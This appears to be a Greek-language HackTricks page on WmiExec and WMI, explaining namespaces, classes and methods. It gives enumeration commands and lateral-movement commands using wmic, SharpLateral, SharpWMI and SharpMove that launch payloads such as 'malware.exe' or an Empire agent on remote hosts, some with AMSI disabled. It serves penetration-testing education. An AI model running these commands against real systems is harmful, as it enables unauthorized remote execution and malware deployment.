# WmiExec

{{#include ../../banners/hacktricks-training.md}}

## Πώς λειτουργεί

Μπορούν να ανοίξουν processes σε hosts όπου είναι γνωστά το username και είτε το password είτε το hash, μέσω της χρήσης του WMI. Οι εντολές εκτελούνται μέσω WMI από το Wmiexec, παρέχοντας μια semi-interactive εμπειρία shell.

**dcomexec.py:** Χρησιμοποιώντας διαφορετικά DCOM endpoints, αυτό το script προσφέρει ένα semi-interactive shell παρόμοιο με το wmiexec.py, αξιοποιώντας συγκεκριμένα το ShellBrowserWindow DCOM object. Προς το παρόν υποστηρίζει τα MMC20. Application, Shell Windows και Shell Browser Window objects. (πηγή: [Hacking Articles](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/))<sup>[[2]](#references)</sup>

## Βασικές αρχές του WMI

### Namespace

Με δομή ιεραρχίας τύπου directory, το top-level container του WMI είναι το \root, κάτω από το οποίο οργανώνονται επιπλέον directories, τα οποία αναφέρονται ως namespaces.<sup>[[1]](#references)</sup>
Εντολές για την καταχώριση των namespaces:
```bash
# Retrieval of Root namespaces
gwmi -namespace "root" -Class "__Namespace" | Select Name

# Enumeration of all namespaces (administrator privileges may be required)
Get-WmiObject -Class "__Namespace" -Namespace "Root" -List -Recurse 2> $null | select __Namespace | sort __Namespace

# Listing of namespaces within "root\cimv2"
Get-WmiObject -Class "__Namespace" -Namespace "root\cimv2" -List -Recurse 2> $null | select __Namespace | sort __Namespace
```
Οι κλάσεις μέσα σε ένα namespace μπορούν να απαριθμηθούν χρησιμοποιώντας:
```bash
gwmwi -List -Recurse # Defaults to "root\cimv2" if no namespace specified
gwmi -Namespace "root/microsoft" -List -Recurse
```
### **Κλάσεις**

Η γνώση του ονόματος μιας κλάσης WMI, όπως `win32_process`, και του namespace στο οποίο βρίσκεται είναι κρίσιμη για οποιαδήποτε λειτουργία WMI.  
Commands για την εμφάνιση κλάσεων που ξεκινούν με `win32`:
```bash
Get-WmiObject -Recurse -List -class win32* | more # Defaults to "root\cimv2"
gwmi -Namespace "root/microsoft" -List -Recurse -Class "MSFT_MpComput*"
```
Κλήση μιας κλάσης:
```bash
# Defaults to "root/cimv2" when namespace isn't specified
Get-WmiObject -Class win32_share
Get-WmiObject -Namespace "root/microsoft/windows/defender" -Class MSFT_MpComputerStatus
```
### Μέθοδοι

Μπορούν να εκτελεστούν μέθοδοι, οι οποίες αποτελούν μία ή περισσότερες εκτελέσιμες συναρτήσεις των κλάσεων WMI.
```bash
# Class loading, method listing, and execution
$c = [wmiclass]"win32_share"
$c.methods
# To create a share: $c.Create("c:\share\path","name",0,$null,"My Description")
```

```bash
# Method listing and invocation
Invoke-WmiMethod -Class win32_share -Name Create -ArgumentList @($null, "Description", $null, "Name", $null, "c:\share\path",0)
```
## WMI Enumeration

### WMI Service Status

Εντολές για την επαλήθευση ότι η υπηρεσία WMI λειτουργεί:
```bash
# WMI service status check
Get-Service Winmgmt

# Via CMD
net start | findstr "Instrumentation"
```
### Πληροφορίες συστήματος και διεργασιών

Συλλογή πληροφοριών συστήματος και διεργασιών μέσω WMI:
```bash
Get-WmiObject -ClassName win32_operatingsystem | select * | more
Get-WmiObject win32_process | Select Name, Processid
```
Για τους επιτιθέμενους, το WMI είναι ένα ισχυρό εργαλείο για την απαρίθμηση ευαίσθητων δεδομένων σχετικά με συστήματα ή domains.<sup>[[1]](#references)</sup>
```bash
wmic computerystem list full /format:list
wmic process list /format:list
wmic ntdomain list /format:list
wmic useraccount list /format:list
wmic group list /format:list
wmic sysaccount list /format:list
```
Η απομακρυσμένη αναζήτηση του WMI για συγκεκριμένες πληροφορίες, όπως οι local admins ή οι συνδεδεμένοι χρήστες, είναι εφικτή με προσεκτική σύνταξη εντολών.

### **Χειροκίνητη απομακρυσμένη αναζήτηση WMI**

Η stealthy αναγνώριση των local admins σε ένα απομακρυσμένο μηχάνημα και των συνδεδεμένων χρηστών μπορεί να επιτευχθεί μέσω συγκεκριμένων WMI queries. Το `wmic` υποστηρίζει επίσης την ανάγνωση από ένα αρχείο κειμένου για την ταυτόχρονη εκτέλεση εντολών σε πολλαπλούς nodes.<sup>[[1]](#references)</sup>

Για την απομακρυσμένη εκτέλεση μιας διεργασίας μέσω WMI, όπως η ανάπτυξη ενός Empire agent, χρησιμοποιείται η ακόλουθη δομή εντολής, με την επιτυχή εκτέλεση να υποδεικνύεται από return value "0":<sup>[[1]](#references)</sup>
```bash
wmic /node:hostname /user:user path win32_process call create "empire launcher string here"
```
Αυτή η διαδικασία αναδεικνύει τη δυνατότητα του WMI για remote execution και system enumeration, επισημαίνοντας τη χρησιμότητά του τόσο για system administration όσο και για penetration testing.

## Αυτόματα εργαλεία

- [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral redwmi HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe
```
- [**SharpWMI**](https://github.com/GhostPack/SharpWMI)
```bash
SharpWMI.exe action=exec [computername=HOST[,HOST2,...]] command=""C:\\temp\\process.exe [args]"" [amsi=disable] [result=true]
# Stealthier execution with VBS
SharpWMI.exe action=executevbs [computername=HOST[,HOST2,...]] [script-specification] [eventname=blah] [amsi=disable] [time-specs]
```
- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=query computername=remote.host.local query="select * from win32_process" username=domain\user password=password
SharpMove.exe action=create computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true username=domain\user password=password
SharpMove.exe action=executevbs computername=remote.host.local eventname=Debug amsi=true username=domain\\user password=password
```
- Θα μπορούσες επίσης να χρησιμοποιήσεις το **Impacket `wmiexec`**.


## Αναφορές

- [1] [Χρήση διαπιστευτηρίων για τον έλεγχο Windows Boxes - Μέρος 3 (WMI και WinRM)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)
- [2] [Οδηγός για αρχάριους στο Impacket Tool Kit - Μέρος 1](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)


{{#include ../../banners/hacktricks-training.md}}
